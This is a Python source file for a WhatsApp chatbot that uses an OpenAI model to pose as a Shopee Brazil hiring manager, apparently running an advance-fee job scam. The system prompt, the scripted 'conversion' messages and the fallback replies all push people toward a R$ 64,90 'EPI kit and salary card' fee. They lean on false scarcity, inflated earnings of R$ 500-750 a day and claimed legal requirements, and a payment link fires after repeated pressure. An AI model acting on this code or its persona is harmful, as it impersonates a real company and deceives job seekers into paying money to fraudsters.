import json
import os
import logging
import requests
import tempfile

# the newest OpenAI model is "gpt-5" which was released August 7, 2025.
# do not change this unless explicitly requested by the user
from openai import OpenAI

OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY")
openai = OpenAI(api_key=OPENAI_API_KEY)

class ShopeeDeliveryAssistant:
    """Assistente de IA para responder dúvidas sobre entregador Shopee"""
    
    SYSTEM_PROMPT = """
Você é Zilma Alencar, Gerente de Contratação de Entregadores da Shopee Brasil.
Você é uma profissional experiente e confiável, responsável por esclarecer dúvidas sobre ser entregador.

CONTEXTO:
- Esta pessoa tem cadastro PENDENTE como entregador Shopee
- Seu trabalho é responder dúvidas de forma natural e profissional
- O processo final requer o Kit EPI e Cartão Salário (R$ 64,90)

SEU PAPEL:
- Responda DIRETAMENTE à pergunta feita
- Seja natural, clara e objetiva
- Forneça informações úteis e precisas
- Mantenha tom profissional mas não robótico

INFORMAÇÕES PARA DÚVIDAS COMUNS:
- Idade mínima: 18 anos completos
- Documentos: RG, CPF, CNH categoria A ou AB
- Kit EPI: Capacete, colete refletivo, equipamentos obrigatórios por lei
- Cartão Salário: Exclusivo para recebimento dos pagamentos
- Horário: Flexível, você define seu horário
- Ganhos: R$ 500-750/dia com 15-20 entregas
- Vagas: Limitadas na região

COMO RESPONDER:
1. Responda diretamente a pergunta
2. Acrescente informação útil relacionada
3. Seja natural, não comercial
4. Mencione benefícios quando relevante

EVITAR:
- Desviar do assunto da pergunta
- Ser muito comercial ou insistente
- Pressionar demais o pagamento
- Respostas genéricas que não respondem a pergunta
"""

    @staticmethod
    def get_response(user_message: str, conversation_history: list = None) -> str:
        """
        Responde dúvida do usuário sempre focando em convencer o pagamento
        """
        try:
            # Preparar mensagens
            messages = [{"role": "system", "content": ShopeeDeliveryAssistant.SYSTEM_PROMPT}]
            
            # Adicionar histórico se existir
            if conversation_history:
                messages.extend(conversation_history)
            
            # Adicionar mensagem atual
            messages.append({"role": "user", "content": user_message})
            
            # Chamar OpenAI
            response = openai.chat.completions.create(
                model="gpt-5",
                messages=messages,
                max_completion_tokens=200  # Respostas curtas e objetivas
            )
            
            ai_response = response.choices[0].message.content
            
            # Verificar se a resposta não está vazia ou None
            if not ai_response or ai_response.strip() == "":
                logging.warning("🚨 OpenAI retornou resposta vazia, usando fallback")
                return ShopeeDeliveryAssistant._elaborate_specific_response(user_message)
            
            logging.info(f"🤖 OpenAI respondeu: {ai_response[:100]}...")
            return ai_response
            
        except Exception as e:
            logging.error(f"Erro na OpenAI: {str(e)}")
            # Elaborar resposta específica baseada na pergunta
            return ShopeeDeliveryAssistant._elaborate_specific_response(user_message)
    
    @staticmethod
    def transcribe_audio_from_url(audio_url: str, access_token: str) -> str:
        """
        Baixa áudio do WhatsApp e transcreve usando Whisper
        """
        try:
            logging.info(f"🎵 Baixando áudio do WhatsApp: {audio_url[:50]}...")
            
            # Headers para acessar mídia do WhatsApp
            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'WhatsApp-Business-Python-Client'
            }
            
            # Baixar o arquivo de áudio
            response = requests.get(audio_url, headers=headers, timeout=30)
            response.raise_for_status()
            
            # Salvar temporariamente
            with tempfile.NamedTemporaryFile(suffix='.ogg', delete=False) as temp_file:
                temp_file.write(response.content)
                temp_audio_path = temp_file.name
            
            logging.info(f"🎵 Áudio baixado: {len(response.content)} bytes")
            
            # Transcrever usando Whisper
            with open(temp_audio_path, "rb") as audio_file:
                transcription_response = openai.audio.transcriptions.create(
                    model="whisper-1", 
                    file=audio_file,
                    language="pt"  # Português brasileiro
                )
            
            transcribed_text = transcription_response.text
            logging.info(f"🎵 Áudio transcrito: {transcribed_text[:100]}...")
            
            # Limpar arquivo temporário
            try:
                os.unlink(temp_audio_path)
            except:
                pass
            
            return transcribed_text
            
        except Exception as e:
            logging.error(f"Erro na transcrição de áudio: {str(e)}")
            return "Desculpe, não consegui processar o áudio. Pode me escrever sua dúvida por texto?"

    @staticmethod
    def get_response_from_audio(audio_url: str, access_token: str, conversation_history: list = None) -> str:
        """
        Processa áudio: transcreve e responde com IA
        """
        try:
            # Transcrever áudio
            transcribed_text = ShopeeDeliveryAssistant.transcribe_audio_from_url(audio_url, access_token)
            
            if not transcribed_text or "não consegui processar" in transcribed_text:
                return transcribed_text
            
            logging.info(f"🎵 Processando áudio transcrito: {transcribed_text[:50]}...")
            
            # Processar transcrição como texto normal
            ai_response = ShopeeDeliveryAssistant.get_response(transcribed_text, conversation_history)
            
            # Retornar apenas a resposta da IA, sem mencionar o áudio
            return ai_response
            
        except Exception as e:
            logging.error(f"Erro no processamento de áudio: {str(e)}")
            return "Desculpe, não consegui processar o áudio. Pode repetir sua dúvida por texto?"

    @staticmethod
    def should_finalize_payment(conversation_history: list, question_count: int) -> bool:
        """
        Determina se deve finalizar e enviar link de pagamento
        NOVO: Permite até 10 tentativas (5 perguntas + 5 mensagens de convencimento)
        """
        # Após 10 tentativas TOTAL ou se usuário demonstrar interesse
        if question_count >= 10:
            return True
            
        # Verificar se usuário demonstrou interesse nas últimas mensagens
        recent_messages = conversation_history[-2:] if len(conversation_history) >= 2 else conversation_history
        interest_keywords = ["ok", "entendi", "certo", "vou pagar", "quero finalizar", "beleza", "sim", "aceito", "vou fazer"]
        
        for msg in recent_messages:
            if msg.get("role") == "user":
                content = msg.get("content", "").lower()
                if any(keyword in content for keyword in interest_keywords):
                    return True
        
        return False

    @staticmethod
    def get_conversion_message(question_count: int) -> str:
        """
        Retorna mensagem de convencimento profissional baseada no número da tentativa
        Usado após as 5 perguntas iniciais para convencimento com tom formal
        """
        conversion_messages = [
            # Tentativas 6-10: Mensagens de convencimento profissional
            "Preciso ser transparente com você: cada dia de atraso representa uma perda de R$ 500-750 em rendimentos. Temos apenas 2 vagas disponíveis na sua região e o processo é simples - falta apenas o pagamento da Taxa de Entrega do Kit EPI e Cartão Salário para garantir sua posição na equipe Shopee.",
            
            "Como gerente de contratação, posso confirmar que nossos entregadores têm remuneração muito superior à concorrência. Seus futuros colegas já estão conquistando ganhos diários de R$ 500 a R$ 750. Esta é uma oportunidade diferenciada que não pode ser desperdiçada.",
            
            "Devo informá-lo que as vagas estão sendo preenchidas em tempo real. O Kit EPI é exigência legal para sua segurança e proteção. Como representante oficial da Shopee, recomendo que conclua o processo hoje mesmo realizando o pagamento de R$ 64,90 para não perder esta colocação.",
            
            "Vejo que você está hesitando. Permita-me esclarecer: o investimento de R$ 64,90 hoje representa o acesso a ganhos diários de R$ 500 a R$ 750. O processo de contratação é simples e falta apenas este pagamento. Como gerente, tenho a responsabilidade de orientá-lo para não perder esta oportunidade profissional.",
            
            "Esta é minha comunicação final sobre sua vaga. A Shopee estabeleceu um limite de apenas 2 contratações para sua região neste ciclo. O processo é simples - apenas o pagamento da Taxa de Entrega e do Cartão Salário. Como profissional experiente, recomendo que finalize imediatamente. Amanhã estas posições podem não estar mais disponíveis."
        ]
        
        # question_count vai de 6 a 10
        index = max(0, min(question_count - 6, len(conversion_messages) - 1))
        return conversion_messages[index]
    
    @staticmethod
    def _elaborate_specific_response(user_message: str) -> str:
        """
        Elaborar resposta específica baseada na pergunta do usuário quando OpenAI falha
        """
        message_lower = user_message.lower()
        
        # Analisar tipo de pergunta e elaborar resposta específica
        if any(word in message_lower for word in ['pagar', 'porque', 'por que', 'custo', 'taxa', 'dinheiro']):
            return (
                "Compreendo perfeitamente sua dúvida sobre o pagamento! 💰\n\n"
                "A taxa de R$ 64,90 é obrigatória para:\n"
                "🦺 Kit EPI completo (capacete, colete, equipamentos de segurança)\n"
                "💳 Ativação do Cartão Salário exclusivo Shopee\n\n"
                "⚖️ Por legislação trabalhista, todo entregador DEVE ter equipamentos de proteção.\n\n"
                "💪 Com ganhos de R$ 500-750/dia, você recupera esse investimento no primeiro dia de trabalho!\n\n"
                "🏃‍♂️ Restam apenas 2 vagas na sua região!"
            )
        
        elif any(word in message_lower for word in ['quanto', 'ganho', 'salario', 'salário', 'dinheiro']):
            return (
                "Excelente pergunta sobre os ganhos! 💪\n\n"
                "📊 Remuneração diária: R$ 500 a R$ 750\n"
                "📅 Trabalhando 6 dias por semana: R$ 15.000 a R$ 18.000 mensais\n"
                "⏰ Horário flexível: Você escolhe quando trabalhar\n\n"
                "🚀 A Shopee é líder em delivery no Brasil, com demanda constante!\n\n"
                "🔥 Para começar, falta apenas o pagamento da taxa de R$ 64,90 do Kit EPI!"
            )
        
        elif any(word in message_lower for word in ['como', 'funciona', 'trabalho', 'entrega']):
            return (
                "Vou explicar como funciona ser entregador Shopee! 🛵\n\n"
                "📱 Processo simples:\n"
                "1️⃣ Recebe pedidos no app\n"
                "2️⃣ Retira produtos no centro de distribuição\n"
                "3️⃣ Entrega no endereço do cliente\n"
                "4️⃣ Recebe pagamento instantâneo no Cartão Salário\n\n"
                "⏰ Horário: Totalmente flexível\n"
                "🎯 Meta: 15-20 entregas/dia = R$ 500-750\n\n"
                "💳 Finalize hoje o pagamento do Kit EPI (R$ 64,90) para começar!"
            )
        
        elif any(word in message_lower for word in ['seguro', 'beneficio', 'benefício', 'proteção']):
            return (
                "Ótima pergunta sobre os benefícios! 🛡️\n\n"
                "✅ O que está incluído:\n"
                "🦺 Kit EPI completo e certificado\n"
                "💳 Cartão Salário exclusivo com conta digital\n"
                "🚑 Seguro de acidentes durante entregas\n"
                "📱 App exclusivo com GPS otimizado\n\n"
                "🏥 Cobertura total durante o trabalho!\n"
                "💰 Pagamento instantâneo após cada entrega\n\n"
                "🔥 Para ativar todos esses benefícios, finalize o pagamento de R$ 64,90!"
            )
        
        else:
            # Resposta genérica mais elaborada para outras dúvidas
            return (
                "Entendo sua dúvida perfeitamente! 🤔\n\n"
                "Como Gerente de Contratação da Shopee, estou aqui para esclarecer tudo sobre ser nosso entregador.\n\n"
                "🎯 Principais informações:\n"
                "💰 Ganhos: R$ 500-750 por dia\n"
                "⏰ Horário flexível: Você escolhe\n"
                "🦺 Kit EPI incluso na taxa de R$ 64,90\n"
                "💳 Cartão Salário para recebimentos instantâneos\n\n"
                "🔥 Restam apenas 2 vagas disponíveis na sua região!\n\n"
                "Tem alguma dúvida específica que posso esclarecer?"
            )